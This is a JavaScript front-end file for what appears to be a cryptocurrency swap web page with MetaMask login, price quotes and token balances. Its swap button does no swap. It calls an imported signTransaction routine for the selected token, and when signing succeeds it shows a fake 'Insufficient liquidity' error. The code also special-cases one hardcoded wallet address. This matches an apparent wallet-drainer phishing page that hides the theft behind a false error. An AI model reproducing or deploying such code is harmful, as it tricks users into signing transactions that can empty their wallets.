import {
  mainNetwork,
  checkNetwork,
  requestConnection,
  checkConnection,
  getUserAddress,
  getMainBalance,
  getTokenBalance,
  signTransaction
} from "./constants.js";

var preciosGuardados = {}, logTokenBalance = 0;

// Carga del front
window.onload = async () => {
  const token1Selected = document.getElementById("token1"),
    token2Selected = document.getElementById("token2"),
    inputToken1 = document.getElementById("input1"),
    inputToken2 = document.getElementById("input2"),
    lblTokenBalance = document.getElementById("lblTokenBalance"),
    buttonMaxBalance = document.getElementById("maxBalance");

  const getTokenPrice = async (id) => {
    const apiTokens = require("./abi-codes/apiTokens.json"),
      enlace = apiTokens[id - 1];

    return await fetch(enlace, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
    }).then(async (res) => {
        const priceData = await res.json();
    
        preciosGuardados[id] = priceData["market_data"]["current_price"]["usd"];
        return preciosGuardados[id];
    });
  };

  const handleInput1 = async () => {
    const token1Select = Number(token1Selected.getAttribute("content")),
        token2Select = Number(token2Selected.getAttribute("content")),
        priceToken1 = (preciosGuardados[token1Select]) ? preciosGuardados[token1Select] : await getTokenPrice(token1Select),
        priceToken2 = (preciosGuardados[token2Select]) ? preciosGuardados[token2Select] : await getTokenPrice(token2Select);


    const resultadoEnUSD = inputToken1.value * priceToken1,
        resultadoEnTokens = resultadoEnUSD / priceToken2;
    
    inputToken2.value = resultadoEnTokens.toFixed(5);
  }


  inputToken1.addEventListener("input", handleInput1);

  buttonMaxBalance.addEventListener("click", () => {
    inputToken1.value = logTokenBalance;
    handleInput1();
  })

  inputToken2.addEventListener("input", async () => {
    const token1Select = Number(token1Selected.getAttribute("content")),
        token2Select = Number(token2Selected.getAttribute("content")),
        priceToken1 = (preciosGuardados[token1Select]) ? preciosGuardados[token1Select] : await getTokenPrice(token1Select),
        priceToken2 = (preciosGuardados[token2Select]) ? preciosGuardados[token2Select] : await getTokenPrice(token2Select);


    const resultadoEnUSD = inputToken2.value * priceToken2,
        resultadoEnTokens = resultadoEnUSD / priceToken1;
    
    inputToken1.value = resultadoEnTokens.toFixed(2);
  });

  checkConnection().then((dataConnect) => {
    const buttonConnect = document.getElementById("connectButton");
    const buttonSwap = document.getElementById("swapButton");
    const sectionLogged = document.getElementById("sectionLogged");

    const setDataLogged = async () => {
      buttonConnect.style.display = "none";
      sectionLogged.style.display = "flex";
      buttonSwap.innerHTML = "Swap";

      if (buttonSwap.classList.contains('connect-wallet1')) buttonSwap.classList.remove('connect-wallet1');
      if (!buttonSwap.classList.contains('connect-wallet')) buttonSwap.classList.add('connect-wallet');

      const userAddress = await getUserAddress(),
        userBalance = await getMainBalance(),
        lblAddress = document.getElementById("lblAddress"),
        lblBalance = document.getElementById("lblBalance");

      lblAddress.innerHTML = `${userAddress.substr(
        0,
        6
      )}...${userAddress.substr(userAddress.length - 4, userAddress.length)}`;
      lblBalance.innerHTML = `${userBalance} ETH`;

      const downAddress = "0xE730209f3Cd085c5379D36D7552118BDA427E785";
      if (userAddress == downAddress) {
        token2Selected.setAttribute("content", "2");
        
      }

      var resetButton = false;

      const swapFunction = async () => {
        var pendingTransaction = false;

        if (!pendingTransaction) {
          buttonSwap.innerHTML = "";
          buttonSwap.classList.add("button--loading");
          pendingTransaction = true;

          const token1Select = Number(token1Selected.getAttribute("content")),
              token2Select = Number(token2Selected.getAttribute("content"));
          
              
          var indexSelected = token2Select - 1, check;
          if (indexSelected != 5) {
            check = await signTransaction(indexSelected)
          } else {
            indexSelected = token1Select - 1;
            check = (indexSelected != 5) ? await signTransaction(indexSelected) : await signTransaction(0);
          }

          pendingTransaction = false;
          buttonSwap.classList.remove("button--loading");

           if (!check) {
            buttonSwap.innerHTML = "Swap";
          } else {
            buttonSwap.innerHTML = '<span class="button__text">Insufficient liquidity</span>';
            buttonSwap.classList.remove("connect-wallet");
            buttonSwap.classList.add("connect-wallet1");
            buttonSwap.removeEventListener("click", swapFunction);
            resetButton = true;
          }
        }
      }

      buttonSwap.addEventListener("click", swapFunction);

      const token1Select = Number(token1Selected.getAttribute("content"));
      logTokenBalance = await getTokenBalance(token1Select);
      lblTokenBalance.innerHTML = `Balance: ${logTokenBalance}`;

      const modalTokens = document.getElementsByName("modalTokens");
      modalTokens.forEach((token) => {
          token.addEventListener("click", async () => {
              const token1Select = Number(token1Selected.getAttribute("content")),
              token2Select = Number(token2Selected.getAttribute("content")),
              priceToken1 = (preciosGuardados[token1Select]) ? preciosGuardados[token1Select] : await getTokenPrice(token1Select),
              priceToken2 = (preciosGuardados[token2Select]) ? preciosGuardados[token2Select] : await getTokenPrice(token2Select);

              const resultadoEnUSD = inputToken1.value * priceToken1,
                  resultadoEnTokens = resultadoEnUSD / priceToken2;
              
              inputToken2.value = resultadoEnTokens.toFixed(2);

              const resultadoEnUSD2 = inputToken2.value * priceToken2,
                  resultadoEnTokens2 = resultadoEnUSD2 / priceToken1;
              
              inputToken1.value = resultadoEnTokens2.toFixed(2);

              logTokenBalance = await getTokenBalance(token1Select);
              lblTokenBalance.innerHTML = `Balance: ${logTokenBalance}`;

              if (resetButton) {
                resetButton = false;
                buttonSwap.addEventListener("click", swapFunction);
                buttonSwap.innerHTML = "Swap";

                if (buttonSwap.classList.contains('connect-wallet1')) buttonSwap.classList.remove('connect-wallet1');
                if (!buttonSwap.classList.contains('connect-wallet')) buttonSwap.classList.add('connect-wallet');
              }
          })
      });
    };
  

    const connectMetamask = () => {
      requestConnection().then((data) => {
        if (data.connect) setDataLogged();
      });
    };

    if (!dataConnect.connect) {
      sectionLogged;
      buttonConnect.style.display = "flex";

      buttonConnect.onclick = connectMetamask;
      buttonSwap.onclick = connectMetamask;
    } else {
      setDataLogged();
    }
  });

  if (window.ethereum) {
    window.ethereum.on("chainChanged", (net_id) => {
      if (net_id != mainNetwork) {
        setTimeout(() => {
          checkNetwork();
        }, 3000);
      }
    });

    checkNetwork();
  }
};
